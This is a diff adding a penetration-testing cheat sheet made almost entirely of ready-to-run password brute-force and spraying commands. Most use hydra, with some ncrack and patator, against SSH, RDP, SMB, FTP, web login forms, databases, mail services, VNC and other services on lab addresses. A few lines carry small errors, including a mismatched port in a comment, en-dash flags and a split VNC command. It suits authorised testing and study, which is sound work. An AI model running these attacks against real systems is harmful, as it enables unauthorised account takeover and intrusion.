@@ -1,0 +1,81 @@
+#without -L flag (used default usernames like root, admin, or guest; -t32(task) -s 2122(port) ):
+hydra -P passwords.txt ssh://10.0.2.5 -t 32 -s 2112
+hydra -P passwords.txt -t 32 ssh://10.0.2.5:2112
+
+#Password spraying -u flag, means try each password for every users:
+hydra -Lusers.txt -Ppasswords.txt 192.168.0.1 ssh -u -V
+
+GUI 
+xhydra 
+
+RDP 
+hydra -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -V 
+hydra -f -L usernames.txt -P passwords.txt rdp://10.0.2.5 -s 3333 -V #with port
+ncrack -p 3389 --user admin -P passwords.txt 10.0.2.5  #optimized for speed and accuracy
+
+SSH 
+hydra -l root -P passwords.txt -f ssh://10.0.2.5 -V
+patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed.'
+#Recommed 1 more Wordlist for patator: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
+SMB 
+hydra -l Administrator -P passwords.txt -f smb://10.0.2.5 -V  
+
+FTP 
+hydra -l root -P passwords.txt -f ftp://10.0.2.5 -V 
+#Default UsernamePassword together; attack
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.243.46:3145
+
+HTTP Basic Auth 
+hydra -L users.txt -P password.txt 10.0.2.5 http-get /login/ -V 
+
+IMAP 
+hydra -l root -P passwords.txt -f imap://10.0.2.5 -V 
+
+MySQL 
+hydra -L usernames.txt -P pass.txt -f mysql://10.0.2.5 -V 
+
+MSSQL
+hydra -L users.txt -P rockyou.txt mssql://192.168.10.144
+
+POP3 
+hydra -l USERNAME -P passwords.txt -f pop3://10.0.2.5 -V 
+
+Redis 
+hydra –P password.txt redis://10.0.2.5 -V 
+
+Rexec 
+hydra -l root -P password.txt rexec://10.0.2.5 -V 
+
+Rlogin 
+hydra -l root -P password.txt rlogin://10.0.2.5 -V 
+
+RSH 
+hydra -L username.txt rsh://10.0.2.5 -V
+
+RSP 
+hydra -l root -P passwords.txt <IP> rtsp 
+
+LDAP
+hydra -l root -P passwords.txt ldap://$IP
+
+SMTP 
+hydra -P /usr/share/wordlistsnmap.lst 10.11.1.111 smtp -V
+hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V 
+hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V  #Port 587 for SMTP with SSL 
+
+SNMP
+hydra -P password-file.txt -v 10.11.1.111 snmp
+
+Telnet 
+hydra -l root -P passwords.txt [-t 32] <IP> telnet 
+
+VNC 
+hydra -L usesr.txt –P passwords.txt -s <PORT>  
+<IP> vnc 
+
+HTTP Login GET
+hydra -L cewl.txt -P cewl.txt 10.0.2.5 http-get-form "/~login:username=^USER^&password=^PASS^&Login=Login:Unauthorized" -V
+
+HTTP Post 
+hydra -L users.txt -P password.txt 10.0.2.5  http-post-form "/path/index.php:UserName=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
